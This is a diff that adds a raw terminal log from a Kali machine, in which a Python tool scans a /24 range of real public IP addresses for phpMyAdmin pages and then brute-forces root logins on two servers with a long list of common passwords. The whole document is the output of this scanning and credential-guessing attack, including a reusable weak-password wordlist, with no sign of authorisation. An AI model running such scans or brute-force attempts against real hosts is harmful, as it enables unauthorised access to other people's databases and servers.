@@ -1,0 +1,384 @@
+root@kali:~/devs/py-labs/bpma# ./main.py -ipsb 54.38.79.2/24 -port 80,8080
+http://54.38.79.1/phpMyAdmin/ [connect-error]
+http://54.38.79.64:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.1/index.php [connect-error]
+http://54.38.79.64:8080/index.php [connect-error]
+http://54.38.79.128/phpMyAdmin/ [status_code:404]
+http://54.38.79.1/phpmyadmin/ [connect-error]
+http://54.38.79.64:8080/phpmyadmin/ [connect-error]
+http://54.38.79.1/dh_phpmyadmin/ [connect-error]
+http://54.38.79.64:8080/dh_phpmyadmin/ [connect-error]
+http://54.38.79.128/index.php [status_code:404]
+http://54.38.79.1/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.64:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.1/_phpmyadmin/ [connect-error]
+http://54.38.79.64:8080/_phpmyadmin/ [connect-error]
+http://54.38.79.128/phpmyadmin/ [status_code:404]
+http://54.38.79.1/_phpMyAdmin/ [connect-error]
+http://54.38.79.64:8080/_phpMyAdmin/ [connect-error]
+http://54.38.79.1/phpmyadmin2/ [connect-error]
+http://54.38.79.64:8080/phpmyadmin2/ [connect-error]
+http://54.38.79.128/dh_phpmyadmin/ [status_code:404]
+http://54.38.79.1/phpMyAdmin2/ [connect-error]
+http://54.38.79.64:8080/phpMyAdmin2/ [connect-error]
+http://54.38.79.1/phpmyadmin3/ [connect-error]
+http://54.38.79.64:8080/phpmyadmin3/ [connect-error]
+http://54.38.79.128/dh_phpMyAdmin/ [status_code:404]
+http://54.38.79.1/phpMyAdmin3/ [connect-error]
+http://54.38.79.64:8080/phpMyAdmin3/ [connect-error]
+http://54.38.79.1:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.128/_phpmyadmin/ [status_code:404]
+http://54.38.79.1:8080/index.php [connect-error]
+http://54.38.79.65/phpMyAdmin/ [status_code:404]
+http://54.38.79.1:8080/phpmyadmin/ [connect-error]
+http://54.38.79.191:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.128/_phpMyAdmin/ [status_code:404]
+http://54.38.79.1:8080/dh_phpmyadmin/ [connect-error]
+http://54.38.79.65/index.php [status_code:200]
+something error! actionUrl:  userName:  passwd: 
+http://54.38.79.1:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.128/phpmyadmin2/ [status_code:404]
+http://54.38.79.1:8080/_phpmyadmin/ [connect-error]
+http://54.38.79.65:8080/phpMyAdmin/ [status_code:404]
+http://54.38.79.1:8080/_phpMyAdmin/ [connect-error]
+http://54.38.79.128/phpMyAdmin2/ [status_code:404]
+http://54.38.79.1:8080/phpmyadmin2/ [connect-error]
+http://54.38.79.1:8080/phpMyAdmin2/ [connect-error]
+http://54.38.79.65:8080/index.php [status_code:404]
+http://54.38.79.128/phpmyadmin3/ [status_code:404]
+http://54.38.79.1:8080/phpmyadmin3/ [connect-error]
+http://54.38.79.1:8080/phpMyAdmin3/ [connect-error]
+http://54.38.79.65:8080/phpmyadmin/ [status_code:404]
+http://54.38.79.128/phpMyAdmin3/ [status_code:404]
+http://54.38.79.128:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.2/phpMyAdmin/ [status_code:404]
+http://54.38.79.65:8080/dh_phpmyadmin/ [status_code:404]
+http://54.38.79.128:8080/index.php [connect-error]
+http://54.38.79.128:8080/phpmyadmin/ [connect-error]
+http://54.38.79.2/index.php [status_code:404]
+http://54.38.79.65:8080/dh_phpMyAdmin/ [status_code:404]
+http://54.38.79.128:8080/dh_phpmyadmin/ [connect-error]
+http://54.38.79.128:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.191:8080/index.php [connect-error]
+http://54.38.79.2/phpmyadmin/ [status_code:404]
+http://54.38.79.128:8080/_phpmyadmin/ [connect-error]
+http://54.38.79.65:8080/_phpmyadmin/ [status_code:404]
+http://54.38.79.128:8080/_phpMyAdmin/ [connect-error]
+http://54.38.79.128:8080/phpmyadmin2/ [connect-error]
+http://54.38.79.2/dh_phpmyadmin/ [status_code:404]
+http://54.38.79.65:8080/_phpMyAdmin/ [status_code:404]
+http://54.38.79.128:8080/phpMyAdmin2/ [connect-error]
+http://54.38.79.128:8080/phpmyadmin3/ [connect-error]
+http://54.38.79.191:8080/phpmyadmin/ [connect-error]
+http://54.38.79.2/dh_phpMyAdmin/ [status_code:404]
+http://54.38.79.65:8080/phpmyadmin2/ [status_code:404]
+http://54.38.79.128:8080/phpMyAdmin3/ [connect-error]
+http://54.38.79.129/phpMyAdmin/ [connect-error]
+http://54.38.79.2/_phpmyadmin/ [status_code:404]
+http://54.38.79.65:8080/phpMyAdmin2/ [status_code:404]
+http://54.38.79.129/index.php [connect-error]
+http://54.38.79.129/phpmyadmin/ [connect-error]
+http://54.38.79.2/_phpMyAdmin/ [status_code:404]
+http://54.38.79.129/dh_phpmyadmin/ [connect-error]
+http://54.38.79.65:8080/phpmyadmin3/ [status_code:404]
+http://54.38.79.129/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.129/_phpmyadmin/ [connect-error]
+http://54.38.79.2/phpmyadmin2/ [status_code:404]
+http://54.38.79.65:8080/phpMyAdmin3/ [status_code:404]
+http://54.38.79.129/_phpMyAdmin/ [connect-error]
+http://54.38.79.129/phpmyadmin2/ [connect-error]
+http://54.38.79.2/phpMyAdmin2/ [status_code:404]
+http://54.38.79.66/phpMyAdmin/ [status_code:404]
+http://54.38.79.129/phpMyAdmin2/ [connect-error]
+http://54.38.79.129/phpmyadmin3/ [connect-error]
+http://54.38.79.2/phpmyadmin3/ [status_code:404]
+http://54.38.79.66/index.php [status_code:200]
+something error! actionUrl:  userName:  passwd: 
+http://54.38.79.129/phpMyAdmin3/ [connect-error]
+http://54.38.79.129:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.66:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.2/phpMyAdmin3/ [status_code:404]
+http://54.38.79.129:8080/index.php [connect-error]
+http://54.38.79.66:8080/index.php [connect-error]
+http://54.38.79.191:8080/dh_phpmyadmin/ [connect-error]
+http://54.38.79.129:8080/phpmyadmin/ [connect-error]
+http://54.38.79.66:8080/phpmyadmin/ [connect-error]
+http://54.38.79.129:8080/dh_phpmyadmin/ [connect-error]
+http://54.38.79.2:8080/phpMyAdmin/ [status_code:404]
+http://54.38.79.66:8080/dh_phpmyadmin/ [connect-error]
+http://54.38.79.129:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.66:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.129:8080/_phpmyadmin/ [connect-error]
+http://54.38.79.2:8080/index.php [status_code:200]
+http://54.38.79.66:8080/_phpmyadmin/ [connect-error]
+http://54.38.79.129:8080/_phpMyAdmin/ [connect-error]
+http://54.38.79.66:8080/_phpMyAdmin/ [connect-error]
+http://54.38.79.191:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.129:8080/phpmyadmin2/ [connect-error]
+http://54.38.79.66:8080/phpmyadmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:root
+http://54.38.79.129:8080/phpMyAdmin2/ [connect-error]
+http://54.38.79.66:8080/phpMyAdmin2/ [connect-error]
+http://54.38.79.129:8080/phpmyadmin3/ [connect-error]
+http://54.38.79.66:8080/phpmyadmin3/ [connect-error]
+http://54.38.79.129:8080/phpMyAdmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:123456
+http://54.38.79.66:8080/phpMyAdmin3/ [connect-error]
+http://54.38.79.191:8080/_phpmyadmin/ [connect-error]
+http://54.38.79.130/phpMyAdmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:admin
+http://54.38.79.67/phpMyAdmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:123456789
+http://54.38.79.67/index.php [status_code:200]
+something error! actionUrl:  userName:  passwd: 
+http://54.38.79.191:8080/_phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:111111
+http://54.38.79.130/index.php [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:12345678
+http://54.38.79.130/phpmyadmin/ [status_code:404]
+http://54.38.79.130/dh_phpmyadmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:123123
+http://54.38.79.67:8080/phpMyAdmin/ [status_code:404]
+http://54.38.79.130/dh_phpMyAdmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:5201314
+http://54.38.79.67:8080/index.php [status_code:404]
+http://54.38.79.130/_phpmyadmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:000000
+http://54.38.79.67:8080/phpmyadmin/ [status_code:404]
+http://54.38.79.130/_phpMyAdmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:11111111
+http://54.38.79.67:8080/dh_phpmyadmin/ [status_code:404]
+http://54.38.79.130/phpmyadmin2/ [status_code:404]
+http://54.38.79.191:8080/phpmyadmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:a123456
+http://54.38.79.67:8080/dh_phpMyAdmin/ [status_code:404]
+http://54.38.79.130/phpMyAdmin2/ [status_code:404]
+http://54.38.79.67:8080/_phpmyadmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:163.com
+http://54.38.79.130/phpmyadmin3/ [status_code:404]
+http://54.38.79.67:8080/_phpMyAdmin/ [status_code:404]
+http://54.38.79.191:8080/phpMyAdmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:123321
+http://54.38.79.130/phpMyAdmin3/ [status_code:404]
+http://54.38.79.130:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.67:8080/phpmyadmin2/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:123123123
+http://54.38.79.130:8080/index.php [connect-error]
+http://54.38.79.130:8080/phpmyadmin/ [connect-error]
+http://54.38.79.67:8080/phpMyAdmin2/ [status_code:404]
+http://54.38.79.130:8080/dh_phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:00000000
+http://54.38.79.130:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.67:8080/phpmyadmin3/ [status_code:404]
+http://54.38.79.130:8080/_phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:1314520
+http://54.38.79.130:8080/_phpMyAdmin/ [connect-error]
+http://54.38.79.67:8080/phpMyAdmin3/ [status_code:404]
+http://54.38.79.130:8080/phpmyadmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:7758521
+http://54.38.79.130:8080/phpMyAdmin2/ [connect-error]
+http://54.38.79.130:8080/phpmyadmin3/ [connect-error]
+http://54.38.79.130:8080/phpMyAdmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:1234567
+http://54.38.79.68/phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:666666
+http://54.38.79.191:8080/phpmyadmin3/ [connect-error]
+http://54.38.79.131/phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:123456a
+http://54.38.79.68/index.php [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:1234567890
+http://54.38.79.191:8080/phpMyAdmin3/ [connect-error]
+http://54.38.79.192/phpMyAdmin/ [connect-error]
+http://54.38.79.131/index.php [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:woaini
+http://54.38.79.192/index.php [connect-error]
+http://54.38.79.68/phpmyadmin/ [connect-error]
+http://54.38.79.192/phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:a123456789
+http://54.38.79.192/dh_phpmyadmin/ [connect-error]
+http://54.38.79.192/dh_phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:888888
+http://54.38.79.131/phpmyadmin/ [connect-error]
+http://54.38.79.192/_phpmyadmin/ [connect-error]
+http://54.38.79.68/dh_phpmyadmin/ [connect-error]
+http://54.38.79.192/_phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:88888888
+http://54.38.79.192/phpmyadmin2/ [connect-error]
+http://54.38.79.192/phpMyAdmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:147258369
+http://54.38.79.131/dh_phpmyadmin/ [connect-error]
+http://54.38.79.192/phpmyadmin3/ [connect-error]
+http://54.38.79.68/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.192/phpMyAdmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:qq123456
+http://54.38.79.192:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.192:8080/index.php [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:654321
+http://54.38.79.131/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.192:8080/phpmyadmin/ [connect-error]
+http://54.38.79.68/_phpmyadmin/ [connect-error]
+http://54.38.79.192:8080/dh_phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:zxcvbnm
+http://54.38.79.192:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.192:8080/_phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:woaini1314
+http://54.38.79.131/_phpmyadmin/ [connect-error]
+http://54.38.79.192:8080/_phpMyAdmin/ [connect-error]
+http://54.38.79.68/_phpMyAdmin/ [connect-error]
+http://54.38.79.192:8080/phpmyadmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:112233
+http://54.38.79.192:8080/phpMyAdmin2/ [connect-error]
+http://54.38.79.192:8080/phpmyadmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:5211314
+http://54.38.79.131/_phpMyAdmin/ [connect-error]
+http://54.38.79.192:8080/phpMyAdmin3/ [connect-error]
+http://54.38.79.68/phpmyadmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:123456abc
+http://54.38.79.193/phpMyAdmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:520520
+http://54.38.79.193/index.php [status_code:404]
+http://54.38.79.131/phpmyadmin2/ [connect-error]
+http://54.38.79.68/phpMyAdmin2/ [connect-error]
+http://54.38.79.193/phpmyadmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:aaaaaa
+http://54.38.79.193/dh_phpmyadmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:123654
+http://54.38.79.131/phpMyAdmin2/ [connect-error]
+http://54.38.79.193/dh_phpMyAdmin/ [status_code:404]
+http://54.38.79.68/phpmyadmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:987654321
+http://54.38.79.193/_phpmyadmin/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:123456789a
+http://54.38.79.131/phpmyadmin3/ [connect-error]
+http://54.38.79.193/_phpMyAdmin/ [status_code:404]
+http://54.38.79.68/phpMyAdmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:12345
+http://54.38.79.193/phpmyadmin2/ [status_code:404]
+http://54.38.79.193/phpMyAdmin2/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:7758258
+http://54.38.79.131/phpMyAdmin3/ [connect-error]
+http://54.38.79.68:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.193/phpmyadmin3/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:100200
+http://54.38.79.193/phpMyAdmin3/ [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:147258
+http://54.38.79.131:8080/phpMyAdmin/ [connect-error]
+http://54.38.79.68:8080/index.php [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:111222
+http://54.38.79.193:8080/phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:abc123456
+http://54.38.79.131:8080/index.php [connect-error]
+http://54.38.79.68:8080/phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:111222tianya
+http://54.38.79.193:8080/index.php [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:121212
+http://54.38.79.131:8080/phpmyadmin/ [connect-error]
+http://54.38.79.68:8080/dh_phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:1111111
+http://54.38.79.193:8080/phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:abc123
+http://54.38.79.131:8080/dh_phpmyadmin/ [connect-error]
+http://54.38.79.68:8080/dh_phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:110110
+http://54.38.79.193:8080/dh_phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:789456
+http://54.38.79.131:8080/dh_phpMyAdmin/ [connect-error]
+http://54.38.79.68:8080/_phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:q123456
+http://54.38.79.193:8080/dh_phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:123456aa
+http://54.38.79.131:8080/_phpmyadmin/ [connect-error]
+http://54.38.79.68:8080/_phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:aa123456
+http://54.38.79.193:8080/_phpmyadmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:asdasd
+http://54.38.79.131:8080/_phpMyAdmin/ [connect-error]
+http://54.38.79.68:8080/phpmyadmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:999999
+http://54.38.79.193:8080/_phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:123qwe
+http://54.38.79.131:8080/phpmyadmin2/ [connect-error]
+http://54.38.79.68:8080/phpMyAdmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:789456123
+http://54.38.79.193:8080/phpmyadmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:1111111111
+http://54.38.79.131:8080/phpMyAdmin2/ [connect-error]
+http://54.38.79.68:8080/phpmyadmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:1314521
+http://54.38.79.193:8080/phpMyAdmin2/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:iloveyou
+http://54.38.79.131:8080/phpmyadmin3/ [connect-error]
+http://54.38.79.68:8080/phpMyAdmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:qwerty
+http://54.38.79.69/phpMyAdmin/ [status_code:404]
+http://54.38.79.193:8080/phpmyadmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:password
+http://54.38.79.131:8080/phpMyAdmin3/ [connect-error]
+http://54.38.79.69/index.php [status_code:404]
+login:http://54.38.79.2:8080/index.php username:root passwd:qazwsx
+http://54.38.79.69/phpmyadmin/ [status_code:200]
+http://54.38.79.193:8080/phpMyAdmin3/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:159357
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:root
+login:http://54.38.79.2:8080/index.php username:root passwd:222222
+http://54.38.79.132/phpMyAdmin/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:123456
+http://54.38.79.194/phpMyAdmin/ [connect-error]
+login:http://54.38.79.2:8080/index.php username:root passwd:woaini520
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:admin
+login:http://54.38.79.2:8080/index.php username:root passwd:woaini123
+http://54.38.79.194/index.php [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:123456789
+login:http://54.38.79.2:8080/index.php username:root passwd:521521
+http://54.38.79.132/index.php [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:111111
+login:http://54.38.79.2:8080/index.php username:root passwd:asd123
+http://54.38.79.194/phpmyadmin/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:12345678
+login:http://54.38.79.2:8080/index.php username:root passwd:qqqqqq
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:123123
+login:http://54.38.79.2:8080/index.php username:root passwd:qq1111
+http://54.38.79.132/phpmyadmin/ [connect-error]
+http://54.38.79.194/dh_phpmyadmin/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:5201314
+login:http://54.38.79.2:8080/index.php username:root passwd:1234
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:000000
+login:http://54.38.79.2:8080/index.php username:root passwd:qwe123
+http://54.38.79.194/dh_phpMyAdmin/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:11111111
+login:http://54.38.79.2:8080/index.php username:root passwd:111111111
+http://54.38.79.132/dh_phpmyadmin/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:a123456
+login:http://54.38.79.2:8080/index.php username:root passwd:1qaz2wsx
+http://54.38.79.194/_phpmyadmin/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:163.com
+login:http://54.38.79.2:8080/index.php username:root passwd:qwertyuiop
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:123321
+login:http://54.38.79.2:8080/index.php username:root passwd:5201314520
+http://54.38.79.194/_phpMyAdmin/ [connect-error]
+http://54.38.79.132/dh_phpMyAdmin/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:123123123
+login:http://54.38.79.2:8080/index.php username:root passwd:asd123456
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:00000000
+login:http://54.38.79.2:8080/index.php username:root passwd:159753
+http://54.38.79.194/phpmyadmin2/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:1314520
+login:http://54.38.79.2:8080/index.php username:root passwd:31415926
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:7758521
+login:http://54.38.79.2:8080/index.php username:root passwd:qweqwe
+http://54.38.79.132/_phpmyadmin/ [connect-error]
+http://54.38.79.194/phpMyAdmin2/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:1234567
+login:http://54.38.79.2:8080/index.php username:root passwd:555555
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:666666
+login:http://54.38.79.2:8080/index.php username:root passwd:333333
+http://54.38.79.194/phpmyadmin3/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:123456a
+login:http://54.38.79.2:8080/index.php username:root passwd:woaini521
+http://54.38.79.132/_phpMyAdmin/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:1234567890
+login:http://54.38.79.2:8080/index.php username:root passwd:abcd1234
+http://54.38.79.194/phpMyAdmin3/ [connect-error]
+login:http://54.38.79.69/phpmyadmin/index.php username:root passwd:woaini
+login:http://54.38.79.2:8080/index.php username:root passwd:ASDFGHJKL
+
